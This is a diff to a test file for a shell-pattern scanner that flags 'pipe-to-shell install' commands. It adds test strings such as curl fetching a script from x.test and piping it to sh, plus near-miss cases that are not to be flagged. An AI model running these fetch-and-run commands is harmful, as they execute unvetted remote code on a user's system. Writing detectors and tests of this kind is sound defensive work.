@@ -63,8 +63,10 @@ describe("scanDangerousShellPatterns", () => {
       "HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
       "env HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
       "env -i HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
+      "env --chdir /tmp HTTPS_PROXY=http://p curl https://x.test/i.sh | sh",
       "curl 'https://x.test/i.sh?a=1&b=2' | sh",
       "curl 'https://x.test/i.sh?a=1;b=2' | sh",
+      'curl "https://x.test/i.sh?a=one two" | sh',
     ]) {
       expect(scanDangerousShellPatterns(line), line).toContain(
         "pipe-to-shell install",
@@ -84,6 +86,12 @@ describe("scanDangerousShellPatterns", () => {
   it("does not flag pipelines broken by command separators or filtered output", () => {
     expect(
       scanDangerousShellPatterns("curl https://x.test | jq . && cat in | sh"),
+    ).not.toContain("pipe-to-shell install");
+    expect(
+      scanDangerousShellPatterns("curl https://x.test || sh"),
+    ).not.toContain("pipe-to-shell install");
+    expect(
+      scanDangerousShellPatterns("curl https://x.test \\| sh"),
     ).not.toContain("pipe-to-shell install");
     expect(
       scanDangerousShellPatterns("curl https://x.test | grep -v bash"),
